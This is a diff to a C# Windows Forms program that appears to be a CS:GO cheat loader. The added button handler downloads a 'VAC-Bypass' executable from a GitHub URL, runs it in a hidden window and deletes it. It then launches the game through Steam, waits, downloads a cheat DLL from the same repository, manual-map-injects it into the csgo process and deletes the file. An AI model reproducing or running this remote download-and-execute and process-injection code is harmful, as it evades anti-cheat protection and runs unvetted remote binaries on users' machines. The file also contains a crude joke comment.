@@ -15,6 +15,7 @@ using ManualMapInjection.Injection;
 using System.Net;
 using System.IO;
 using System.Diagnostics;
+using System.Threading;
 
 namespace WindowsFormsApp2
 {
@@ -43,40 +44,86 @@ namespace WindowsFormsApp2
             }
         }
 
-        private void button2_Click_1(object sender, EventArgs e)
+        private void button1_Click(object sender, EventArgs e)
         {
-                WebClient dl = new WebClient();
-                string mainpath = "C:\\cheat.dll"; //You can change the path to wherever you want but just remember to use "\\" instead of just one "\"
-                dl.DownloadFile("https://github.com/doonayy/fortheboys/raw/main/miscs/otv3.dll", mainpath); //Replace "DLL URL" with the URL to directly download your DLL [Example: http://myurl.com/MYDLL.dll]
-                var name = "csgo"; //Replace "csgo" with any exe you want [Example: For Team Fortress 2 you would replace it with "hl2"]
-                var target = Process.GetProcessesByName(name).FirstOrDefault();
-                var path = mainpath;
-                var file = File.ReadAllBytes(path);
+            WebClient dl = new WebClient();
+            string mainpath = "C:\\cheat.dll"; //You can change the path to wherever you want but just remember to use "\\" instead of just one "\"
+            dl.DownloadFile("https://github.com/doonayy/fortheboys/raw/main/miscs/otv3.dll", mainpath); //Replace "DLL URL" with the URL to directly download your DLL [Example: http://myurl.com/MYDLL.dll]
+            var name = "csgo"; //Replace "csgo" with any exe you want [Example: For Team Fortress 2 you would replace it with "hl2"]
+            var target = Process.GetProcessesByName(name).FirstOrDefault();
+            var path = mainpath;
+            var file = File.ReadAllBytes(path);
 
-                //Checking if the DLL isn't found
-                if (!File.Exists(path))
-                {
-                    MessageBox.Show("Error: DLL not found");
-                    return;
-                }
+            //Checking if the DLL isn't found
+            if (!File.Exists(path))
+            {
+                MessageBox.Show("Error: DLL not found");
+                return;
+            }
 
-                //Injection, just leave this alone if you are a beginner
-                var injector = new ManualMapInjector(target) { AsyncInjection = true };
-                label2.Text = $"hmodule = 0x{injector.Inject(file).ToInt64():x8}";
+            //Injection, just leave this alone if you are a beginner
+            var injector = new ManualMapInjector(target) { AsyncInjection = true };
+            label2.Text = $"hmodule = 0x{injector.Inject(file).ToInt64():x8}";
 
-                if (System.IO.File.Exists(mainpath)) //Checking if the DLL exists
-                {
-                    System.IO.File.Delete(mainpath); //Deleting the DLL
-                }
+            if (System.IO.File.Exists(mainpath)) //Checking if the DLL exists
+            {
+                System.IO.File.Delete(mainpath); //Deleting the DLL
+            }
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
 
         }
-        private void label2_Click(object sender, EventArgs e)
-        {
 
+        private void button2_Click_1(object sender, EventArgs e)
+        {
+            WebClient wb = new WebClient();
+            string vacpath = "C:\\VAC-Bypass.exe"; //You can change the path to wherever you want but just remember to use "\\" instead of just one "\"
+            wb.DownloadFile("https://github.com/doonayy/fortheboys/raw/main/miscs/VAC-Bypass-Loader.exe", vacpath);
+            ProcessStartInfo start = new ProcessStartInfo(); //execute it
+            start.FileName = "C:\\VAC-Bypass.exe";
+            start.WindowStyle = ProcessWindowStyle.Hidden; // Do you want to show a console window?
+            start.CreateNoWindow = false;
+            int exitCode;
+            using (Process proc = Process.Start(start)) // Run the external process & wait for it to finish
+            {
+                proc.WaitForExit();
+                exitCode = proc.ExitCode; // Retrieve the app's exit code
+                System.IO.File.Delete(vacpath); //Deleting the the vacbypass
+                {
+                    start.FileName = "steam.exe";
+                    Process.Start("steam://rungameid/730"); //<-- this should launch it, aight let me try
+                    start.WindowStyle = ProcessWindowStyle.Hidden; // Do you want to show a console window? 
+                    start.CreateNoWindow = false; //
+                    Thread.Sleep(20000); //Sleepy MS
+                    {
+                        WebClient dl = new WebClient();
+                        string mainpath = "C:\\cheat.dll"; //You can change the path to wherever you want but just remember to use "\\" instead of just one "\"
+                        dl.DownloadFile("https://github.com/doonayy/fortheboys/raw/main/miscs/otv3.dll", mainpath); //Replace "DLL URL" with the URL to directly download your DLL [Example: http://myurl.com/MYDLL.dll]
+                        var name = "csgo"; //Replace "csgo" with any exe you want [Example: For Team Fortress 2 you would replace it with "hl2"]
+                        var target = Process.GetProcessesByName(name).FirstOrDefault();
+                        var path = mainpath;
+                        var file = File.ReadAllBytes(path);
+
+                        //Checking if the DLL isn't found
+                        if (!File.Exists(path))
+                        {
+                            MessageBox.Show("Error: DLL not found");
+                            return;
+                        }
+
+                        //Injection, just leave this alone if you are a beginner
+                        var injector = new ManualMapInjector(target) { AsyncInjection = true };
+                        label2.Text = $"hmodule = 0x{injector.Inject(file).ToInt64():x8}";
+
+                        if (System.IO.File.Exists(mainpath)) //Checking if the DLL exists
+                        {
+                            System.IO.File.Delete(mainpath); //Deleting the DLL 
+                        } //want me 2 make sex gui? im professional sexer, 
+                    }
+                }
+            }
         }
     }
 }
